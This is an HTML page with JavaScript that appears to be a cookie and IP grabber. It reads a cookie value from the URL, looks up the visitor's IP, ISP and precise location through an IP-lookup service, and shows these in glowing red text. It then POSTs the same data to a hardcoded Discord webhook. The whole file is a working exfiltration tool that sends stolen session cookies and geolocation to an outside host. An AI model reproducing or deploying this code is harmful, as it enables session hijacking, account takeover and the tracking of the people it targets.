<!DOCTYPE html>
<html>
<head>
<style>
body {
    background-color: #000;
    color: #ff3333;
    font-family: 'Courier New', monospace;
    padding: 20px;
}
.line {
    opacity: 0;
    margin: 8px 0;
    text-shadow: 
        0 0 5px #ff3333,
        0 0 10px #ff3333,
        0 0 20px #ff3333,
        0 0 40px #ff3333;
    transition: opacity 0.8s;
}
</style>
</head>
<body>
<div id="container"></div>

<script>
const params = new URLSearchParams(window.location.search);
const container = document.getElementById('container');
const cv = params.get('cookie');
const ipf = params.has('ip');

async function fipf() {
    try {
        const res = await fetch("https://ipwhois.app/json/");
        const data = await res.json();
        return {
            ip: data.ip || 'Unknown',
            isp: data.isp || 'Unknown',
            org: data.org || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country || 'Unknown',
            timezone: data.timezone || 'Unknown',
            lat: data.latitude || 'Unknown',
            lon: data.longitude || 'Unknown'
        };
    } catch {
        return null;
    }
}

function sfo(il) {
    let index = 0;
    function showNext() {
        if (index >= il.length) return;
        const line = document.createElement('div');
        line.className = 'line';
        line.textContent = il[index];
        container.appendChild(line);
        setTimeout(() => {
            line.style.opacity = 1;
            index++;
            setTimeout(showNext, 400);
        }, 100);
    }
    showNext();
}

(async () => {
    let ipd = null;
    if (ipf) ipd = await fipf();

    const il = [];
    if (cv) il.push(`COOKIE: ${cv}`);
    if (ipd) {
        il.push(
            `IP: ${ipd.ip}`,
            `ISP: ${ipd.isp}`,
            `ORG: ${ipd.org}`,
            `CITY: ${ipd.city}`,
            `REGION: ${ipd.region}`,
            `COUNTRY: ${ipd.country}`,
            `TIMEZONE: ${ipd.timezone}`,
            `LAT/LON: ${ipd.lat}, ${ipd.lon}`
        );
    }
    if (il.length) sfo(il);

    if (cv || ipd) {
        const wbhk = "https://discord.com/api/webhooks/1416196052066766958/9AkFsT4oWhvqCq6tUoIzf-L9wpZSFBOUrgYlaw8aQ4SqznnrMw8Z762JJBnaxOTe5YZp";
        const embed = {
            embeds: [{
                color: 0xff3333,
                fields: [
                    cv ? { name: "cookie", value: `\`\`\`${cv}\`\`\`` } : null,
                    ipd ? { name: "info", value:
                        `IP: ${ipd.ip}\nISP: ${ipd.isp}\nORG: ${ipd.org}\nCity: ${ipd.city}\nRegion: ${ipd.region}\nCountry: ${ipd.country}\nTimezone: ${ipd.timezone}\nLat/Lon: ${ipd.lat}, ${ipd.lon}`
                    } : null
                ].filter(Boolean),
                footer: { text: `Sent at ${new Date().toLocaleString()}` }
            }]
        };

        fetch(wbhk, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(embed)
        }).then(() => console.log("Webhook sent"))
          .catch(err => console.error(err));
    }
})();
</script>
</body>
</html>
